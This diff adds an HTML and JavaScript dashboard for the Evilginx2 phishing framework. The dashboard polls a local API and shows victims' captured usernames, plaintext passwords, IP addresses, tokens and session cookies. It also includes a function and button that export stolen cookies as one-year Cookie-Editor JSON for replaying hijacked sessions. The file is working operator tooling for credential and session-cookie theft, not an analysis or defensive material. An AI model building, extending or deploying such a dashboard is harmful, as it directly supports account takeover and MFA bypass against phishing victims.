@@ -1,0 +1,389 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Evilginx2 Dashboard</title>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #0d1117; color: #c9d1d9; font-size: 14px; }
+.container { max-width: 1400px; margin: 0 auto; padding: 20px; }
+header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; padding-bottom: 15px; border-bottom: 1px solid #30363d; }
+h1 { font-size: 20px; color: #f0f6fc; }
+h1 span { color: #58a6ff; }
+.status { font-size: 12px; color: #8b949e; }
+.status .dot { display: inline-block; width: 8px; height: 8px; border-radius: 50%; margin-right: 6px; }
+.status .dot.green { background: #3fb950; }
+.status .dot.red { background: #f85149; }
+.controls { display: flex; gap: 10px; align-items: center; }
+.search-box { padding: 6px 12px; background: #21262d; border: 1px solid #30363d; border-radius: 6px; color: #c9d1d9; font-size: 13px; width: 200px; }
+.search-box:focus { outline: none; border-color: #58a6ff; }
+.btn { padding: 6px 14px; border-radius: 6px; border: 1px solid #30363d; background: #21262d; color: #c9d1d9; cursor: pointer; font-size: 13px; transition: background .2s; }
+.btn:hover { background: #30363d; }
+.btn-primary { background: #238636; border-color: rgba(240,246,252,0.1); color: #fff; }
+.btn-primary:hover { background: #2ea043; }
+.btn-danger { background: #da3633; border-color: rgba(240,246,252,0.1); color: #fff; }
+.btn-danger:hover { background: #f85149; }
+.btn-sm { padding: 3px 8px; font-size: 12px; }
+table { width: 100%; border-collapse: collapse; }
+th { text-align: left; padding: 10px 12px; font-size: 12px; text-transform: uppercase; letter-spacing: 0.05em; color: #8b949e; border-bottom: 2px solid #21262d; white-space: nowrap; }
+td { padding: 10px 12px; border-bottom: 1px solid #21262d; }
+tr:hover > td { background: #161b22; }
+tr.expanded > td { background: #161b22; }
+.id-cell { color: #484f58; font-family: monospace; font-size: 12px; }
+.phishlet-cell { color: #f0883e; font-weight: 600; }
+.username-cell { color: #79c0ff; }
+.password-cell { color: #79c0ff; }
+.tokens-cell .tag { display: inline-block; padding: 2px 8px; border-radius: 10px; font-size: 11px; font-weight: 500; }
+.tag-captured { background: rgba(63,185,80,0.15); color: #3fb950; }
+.tag-empty { background: rgba(139,148,158,0.15); color: #8b949e; }
+.ip-cell { color: #d2a8ff; font-family: monospace; font-size: 12px; }
+.time-cell { color: #8b949e; font-size: 12px; }
+.actions-cell { white-space: nowrap; }
+.detail-row { display: none; }
+tr.expanded + .detail-row { display: table-row; }
+.detail-row td { padding: 0; }
+.detail-inner { padding: 16px 20px 20px; background: #161b22; border-bottom: 1px solid #30363d; }
+.detail-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; margin-bottom: 16px; }
+.detail-section { }
+.detail-section h3 { font-size: 12px; text-transform: uppercase; letter-spacing: 0.05em; color: #8b949e; margin-bottom: 8px; }
+.detail-field { margin-bottom: 6px; }
+.detail-field .label { font-size: 11px; color: #8b949e; display: block; }
+.detail-field .value { font-size: 13px; color: #f0f6fc; word-break: break-all; font-family: monospace; }
+.detail-field .value.empty { color: #484f58; font-style: italic; }
+.cookie-section { margin-bottom: 10px; }
+.cookie-section h4 { font-size: 12px; color: #f0883e; margin-bottom: 4px; }
+.cookie-entry { font-size: 12px; font-family: monospace; color: #7ee787; padding: 2px 0; }
+.copy-btn { margin-top: 10px; }
+.copy-toast { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); background: #238636; color: #fff; padding: 8px 20px; border-radius: 6px; font-size: 13px; opacity: 0; transition: opacity .3s; pointer-events: none; z-index: 100; }
+.copy-toast.show { opacity: 1; }
+.empty-state { text-align: center; padding: 60px 20px; color: #484f58; }
+.empty-state h2 { font-size: 18px; margin-bottom: 8px; }
+.empty-state p { font-size: 14px; }
+.loading { text-align: center; padding: 40px; }
+.spinner { display: inline-block; width: 24px; height: 24px; border: 3px solid #30363d; border-top-color: #58a6ff; border-radius: 50%; animation: spin .8s linear infinite; }
+@keyframes spin { to { transform: rotate(360deg); } }
+tr.deleted td { opacity: 0.3; }
+.modal-overlay { display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.6); z-index: 200; justify-content: center; align-items: center; }
+.modal-overlay.active { display: flex; }
+.modal { background: #161b22; border: 1px solid #30363d; border-radius: 8px; padding: 24px; max-width: 500px; width: 90%; }
+.modal h2 { font-size: 16px; margin-bottom: 12px; }
+.modal p { font-size: 14px; color: #8b949e; margin-bottom: 20px; }
+.modal-actions { display: flex; gap: 10px; justify-content: flex-end; }
+.cookie-json { background: #0d1117; border: 1px solid #30363d; border-radius: 6px; padding: 12px; font-family: monospace; font-size: 12px; color: #7ee787; max-height: 200px; overflow: auto; white-space: pre-wrap; word-break: break-all; margin-top: 8px; }
+@media (max-width: 768px) {
+  .detail-grid { grid-template-columns: 1fr; }
+  .controls { flex-wrap: wrap; }
+}
+</style>
+</head>
+<body>
+<div class="container">
+  <header>
+    <div>
+      <h1><span>Evilginx2</span> Dashboard</h1>
+      <div class="status" id="status"><span class="dot green"></span>Connected</div>
+    </div>
+    <div class="controls">
+      <input type="text" class="search-box" id="search" placeholder="Search sessions..." oninput="renderSessions()">
+      <button class="btn" onclick="refreshSessions()">Refresh</button>
+    </div>
+  </header>
+
+  <div id="loading" class="loading"><div class="spinner"></div></div>
+  <div id="empty" class="empty-state" style="display:none;">
+    <h2>No sessions yet</h2>
+    <p>Waiting for captured sessions to appear...</p>
+  </div>
+  <div id="table-wrap" style="display:none;">
+    <table>
+      <thead>
+        <tr>
+          <th>ID</th>
+          <th>Phishlet</th>
+          <th>Username</th>
+          <th>Password</th>
+          <th>Tokens</th>
+          <th>Remote IP</th>
+          <th>Updated</th>
+          <th></th>
+        </tr>
+      </thead>
+      <tbody id="tbody"></tbody>
+    </table>
+  </div>
+</div>
+
+<div class="modal-overlay" id="confirmModal">
+  <div class="modal">
+    <h2>Delete Session</h2>
+    <p id="confirmText">Are you sure you want to delete this session?</p>
+    <div class="modal-actions">
+      <button class="btn" onclick="closeModal()">Cancel</button>
+      <button class="btn btn-danger" id="confirmDeleteBtn">Delete</button>
+    </div>
+  </div>
+</div>
+
+<div class="copy-toast" id="toast"></div>
+
+<script>
+const AUTH_TOKEN = '__AUTH_TOKEN__';
+let sessions = [];
+let pollTimer = null;
+
+function getAuthParams() {
+  if (AUTH_TOKEN && AUTH_TOKEN !== '') {
+    return '?auth=' + encodeURIComponent(AUTH_TOKEN);
+  }
+  return '';
+}
+
+async function refreshSessions() {
+  try {
+    const res = await fetch('/api/sessions' + getAuthParams());
+    if (!res.ok) throw new Error('HTTP ' + res.status);
+    const data = await res.json();
+    sessions = data.sessions || [];
+    renderSessions();
+    document.getElementById('status').innerHTML = '<span class="dot green"></span>Connected (' + sessions.length + ' sessions)';
+    document.getElementById('loading').style.display = 'none';
+  } catch (e) {
+    document.getElementById('status').innerHTML = '<span class="dot red"></span>Disconnected';
+    document.getElementById('loading').style.display = '';
+    document.getElementById('table-wrap').style.display = 'none';
+    document.getElementById('empty').style.display = 'none';
+  }
+}
+
+function renderSessions() {
+  const q = document.getElementById('search').value.toLowerCase();
+  const filtered = sessions.filter(s => {
+    return (s.phishlet && s.phishlet.toLowerCase().includes(q)) ||
+           (s.username && s.username.toLowerCase().includes(q)) ||
+           (s.password && s.password.toLowerCase().includes(q)) ||
+           (s.remote_addr && s.remote_addr.includes(q)) ||
+           String(s.id).includes(q);
+  });
+
+  const tbody = document.getElementById('tbody');
+  tbody.innerHTML = '';
+
+  if (filtered.length === 0) {
+    document.getElementById('table-wrap').style.display = 'none';
+    document.getElementById('empty').style.display = '';
+    return;
+  }
+
+  document.getElementById('table-wrap').style.display = '';
+  document.getElementById('empty').style.display = 'none';
+
+  for (const s of filtered) {
+    const hasTokens = (s.tokens && Object.keys(s.tokens).length > 0) ||
+                      (s.body_tokens && Object.keys(s.body_tokens).length > 0) ||
+                      (s.http_tokens && Object.keys(s.http_tokens).length > 0);
+    
+    const isExpanded = tbody.querySelector(`tr[data-id="${s.id}"].expanded`) !== null;
+
+    const tr = document.createElement('tr');
+    tr.dataset.id = s.id;
+    if (isExpanded) tr.classList.add('expanded');
+
+    tr.innerHTML = `
+      <td class="id-cell">${s.id}</td>
+      <td class="phishlet-cell">${escHtml(s.phishlet)}</td>
+      <td class="username-cell">${escHtml(truncStr(s.username, 30))}</td>
+      <td class="password-cell">${escHtml(truncStr(s.password, 30))}</td>
+      <td class="tokens-cell"><span class="tag ${hasTokens ? 'tag-captured' : 'tag-empty'}">${hasTokens ? 'captured' : 'empty'}</span></td>
+      <td class="ip-cell">${escHtml(s.remote_addr)}</td>
+      <td class="time-cell">${formatTime(s.update_time)}</td>
+      <td class="actions-cell">
+        <button class="btn btn-sm" onclick="toggleDetail(${s.id})">${isExpanded ? 'Collapse' : 'View'}</button>
+        <button class="btn btn-sm btn-danger" onclick="confirmDelete(${s.id})">Delete</button>
+      </td>
+    `;
+    tr.onclick = function(e) {
+      if (e.target.tagName !== 'BUTTON') toggleDetail(s.id);
+    };
+    tbody.appendChild(tr);
+
+    const detailRow = document.createElement('tr');
+    detailRow.className = 'detail-row';
+    detailRow.dataset.id = s.id;
+    if (isExpanded) detailRow.style.display = 'table-row';
+    
+    let detailHtml = '<td colspan="8"><div class="detail-inner">';
+    detailHtml += '<div class="detail-grid">';
+    
+    detailHtml += '<div class="detail-section">';
+    detailHtml += '<h3>Session Info</h3>';
+    detailHtml += fieldHtml('Session ID', s.session_id || '-');
+    detailHtml += fieldHtml('Phishlet', s.phishlet);
+    detailHtml += fieldHtml('Username', s.username || '<span class="empty">empty</span>');
+    detailHtml += fieldHtml('Password', s.password || '<span class="empty">empty</span>');
+    detailHtml += fieldHtml('Landing URL', s.landing_url || '-');
+    detailHtml += fieldHtml('User-Agent', s.useragent || '-');
+    detailHtml += fieldHtml('Remote IP', s.remote_addr || '-');
+    detailHtml += fieldHtml('Created', formatTime(s.create_time));
+    detailHtml += fieldHtml('Updated', formatTime(s.update_time));
+    detailHtml += '</div>';
+
+    detailHtml += '<div class="detail-section">';
+    if (s.custom && Object.keys(s.custom).length > 0) {
+      detailHtml += '<h3>Custom Fields</h3>';
+      for (const [k, v] of Object.entries(s.custom)) {
+        detailHtml += fieldHtml(k, v);
+      }
+    }
+    if (s.body_tokens && Object.keys(s.body_tokens).length > 0) {
+      detailHtml += '<h3 style="margin-top:10px;">Body Tokens</h3>';
+      for (const [k, v] of Object.entries(s.body_tokens)) {
+        detailHtml += fieldHtml(k, v);
+      }
+    }
+    if (s.http_tokens && Object.keys(s.http_tokens).length > 0) {
+      detailHtml += '<h3 style="margin-top:10px;">HTTP Tokens</h3>';
+      for (const [k, v] of Object.entries(s.http_tokens)) {
+        detailHtml += fieldHtml(k, v);
+      }
+    }
+    detailHtml += '</div></div>';
+
+    if (s.tokens && Object.keys(s.tokens).length > 0) {
+      detailHtml += '<div class="cookie-section"><h3>Cookies</h3>';
+      for (const [domain, cookies] of Object.entries(s.tokens)) {
+        detailHtml += `<h4>${escHtml(domain)}</h4>`;
+        for (const [name, c] of Object.entries(cookies)) {
+          detailHtml += `<div class="cookie-entry">${escHtml(name)}: ${escHtml(truncStr(c.value || c.Value || '', 80))}</div>`;
+        }
+      }
+      detailHtml += '</div>';
+      const cookieJson = getCookieEditorJson(s.tokens);
+      detailHtml += `<div class="cookie-json" id="cookie-json-${s.id}">${escHtml(cookieJson)}</div>`;
+      detailHtml += `<button class="btn btn-primary btn-sm copy-btn" onclick="copyCookies(${s.id})">Copy Cookies (Cookie-Editor)</button>`;
+    } else {
+      detailHtml += '<div class="detail-field"><span class="value empty">No cookies captured</span></div>';
+    }
+
+    detailHtml += '</div></td>';
+    detailRow.innerHTML = detailHtml;
+    tbody.appendChild(detailRow);
+  }
+}
+
+function toggleDetail(id) {
+  const rows = document.querySelectorAll(`tr[data-id="${id}"]`);
+  rows.forEach(r => r.classList.toggle('expanded'));
+  const detailRow = document.querySelector(`tr.detail-row[data-id="${id}"]`);
+  if (detailRow) {
+    detailRow.style.display = detailRow.style.display === 'table-row' ? 'none' : 'table-row';
+  }
+}
+
+function getCookieEditorJson(tokens) {
+  const cookies = [];
+  for (const [domain, cookieMap] of Object.entries(tokens)) {
+    for (const [name, c] of Object.entries(cookieMap)) {
+      const value = c.value || c.Value || '';
+      const path = c.path || c.Path || '/';
+      const httpOnly = c.httpOnly || c.HttpOnly || false;
+      const hostOnly = !domain.startsWith('.');
+      cookies.push({
+        name: name,
+        value: value,
+        domain: hostOnly ? domain : domain.replace(/^\./, ''),
+        path: path,
+        expirationDate: Math.floor(Date.now() / 1000) + 365 * 86400,
+        httpOnly: httpOnly,
+        secure: name.startsWith('__Host-') || name.startsWith('__Secure-') || /secure/i.test(domain),
+        sameSite: 'Lax'
+      });
+    }
+  }
+  return JSON.stringify(cookies, null, 2);
+}
+
+async function copyCookies(id) {
+  const s = sessions.find(x => x.id === id);
+  if (!s || !s.tokens) return;
+  const json = getCookieEditorJson(s.tokens);
+  try {
+    await navigator.clipboard.writeText(json);
+    showToast('Cookies copied to clipboard in Cookie-Editor format');
+  } catch {
+    const el = document.getElementById('cookie-json-' + id);
+    if (el) {
+      const range = document.createRange();
+      range.selectNodeContents(el);
+      const sel = window.getSelection();
+      sel.removeAllRanges();
+      sel.addRange(range);
+      showToast('Select all and copy (Ctrl+C)');
+    }
+  }
+}
+
+async function deleteSession(id) {
+  try {
+    const res = await fetch('/api/sessions/' + id + getAuthParams(), { method: 'DELETE' });
+    if (!res.ok) throw new Error('HTTP ' + res.status);
+    const row = document.querySelector(`tr[data-id="${id}"]`);
+    if (row) row.classList.add('deleted');
+    showToast('Session ' + id + ' deleted');
+    closeModal();
+    setTimeout(refreshSessions, 500);
+  } catch (e) {
+    showToast('Failed to delete: ' + e.message);
+    closeModal();
+  }
+}
+
+let pendingDeleteId = null;
+function confirmDelete(id) {
+  pendingDeleteId = id;
+  document.getElementById('confirmText').textContent = 'Are you sure you want to delete session ID ' + id + '?';
+  document.getElementById('confirmModal').classList.add('active');
+  document.getElementById('confirmDeleteBtn').onclick = function() {
+    if (pendingDeleteId !== null) deleteSession(pendingDeleteId);
+  };
+}
+
+function closeModal() {
+  document.getElementById('confirmModal').classList.remove('active');
+  pendingDeleteId = null;
+}
+
+function showToast(msg) {
+  const el = document.getElementById('toast');
+  el.textContent = msg;
+  el.classList.add('show');
+  clearTimeout(el._timeout);
+  el._timeout = setTimeout(() => el.classList.remove('show'), 2500);
+}
+
+function escHtml(s) {
+  if (!s) return '';
+  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+}
+
+function truncStr(s, n) {
+  if (!s) return '';
+  if (s.length <= n) return s;
+  return s.substring(0, n) + '...';
+}
+
+function fieldHtml(label, value) {
+  return `<div class="detail-field"><span class="label">${escHtml(label)}</span><span class="value">${value}</span></div>`;
+}
+
+function formatTime(ts) {
+  if (!ts) return '-';
+  const d = new Date(ts * 1000);
+  return d.toLocaleString();
+}
+
+refreshSessions();
+setInterval(refreshSessions, 3000);
+</script>
+</body>
+</html>
